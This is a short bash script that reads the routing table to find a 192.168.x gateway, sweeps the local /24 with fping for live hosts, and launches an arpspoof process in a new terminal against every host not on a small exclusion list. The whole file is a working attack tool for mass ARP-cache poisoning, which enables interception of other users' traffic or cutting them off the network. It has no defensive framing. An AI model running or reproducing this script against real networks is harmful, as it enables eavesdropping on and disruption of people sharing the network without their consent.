#!/bin/bash
#if (($# != 1))
#then
#	echo "./arp.sh ip"
#	exit 1
#fi
route -n > ./route.txt
sed "s/ /\n/g" route.txt > route1.txt
NET=`grep "192\.168\..*1" route1.txt`
fping -asg "$NET"/24 2> /dev/null > ./readme.txt
LINE=`cat readme.txt | wc -l`
LINE=$(($LINE+1))
for ((i=1;i<$LINE;i++))
do
	MMM=`sed -n "$i,$i p" readme.txt`
	echo "$MMM"
	if [ $MMM = "192.168.0.1" ] || [ $MMM = "192.168.0.66" ] || [ $MMM = "192.168.0.112" ] || [ $1 = $MMM ] || [ $2 = $MMM ] || [ $3 = $MMM ]
	then
		echo "no"
		continue
	fi
	echo "arpspoof -i eth0 -t $NET $MMM" > minglin.sh
	chmod +x minglin.sh
	gnome-terminal -x bash -c "./minglin.sh;exec bash" > /dev/null
	sleep 1s
done
